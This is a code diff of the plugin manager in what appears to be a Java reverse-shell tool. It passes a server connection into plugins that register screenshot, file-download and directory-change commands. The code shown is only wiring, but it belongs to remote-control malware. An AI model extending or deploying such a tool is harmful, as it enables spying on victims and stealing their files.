@@ -1,20 +1,32 @@
-package obs1d1anc1ph3r.reverseshell.server.plugins;
+package obs1d1anc1ph3r.reverseshell.plugins;
 
 import java.util.Collections;
 import java.util.HashMap;
 import java.util.Map;
+import obs1d1anc1ph3r.reverseshell.ServerConnection;
 
 public class PluginManager {
 
 	private final Map<String, CommandPlugin> plugins = new HashMap<>();
 
-	public PluginManager() {
-		loadPlugins();
+	//Do the thing
+	public PluginManager(ServerConnection serverConnection) {
+		loadPlugins(serverConnection);
 	}
+	
+	//Doing the thing
+	private void loadPlugins(ServerConnection serverConnection) {
+		//Initialize the stuff and give them the dependancies  
+		ScreenshotCommand screenshotCommand = new ScreenshotCommand();
+		screenshotCommand.setServerConnection(serverConnection);
+		plugins.put(screenshotCommand.getCommandName().toLowerCase(), screenshotCommand);
 
-	private void loadPlugins() {
-		plugins.put("screenshot", new ScreenshotCommand());
-		plugins.put("file download", new DownloadCommand());
+		DownloadCommand downloadCommand = new DownloadCommand();
+		downloadCommand.setServerConnection(serverConnection);
+		plugins.put(downloadCommand.getCommandName().toLowerCase(), downloadCommand);
+
+		CDCommand cdCommand = new CDCommand();
+		plugins.put(cdCommand.getCommandName().toLowerCase(), cdCommand);
 	}
 
 	public CommandPlugin getPlugin(String commandName) {
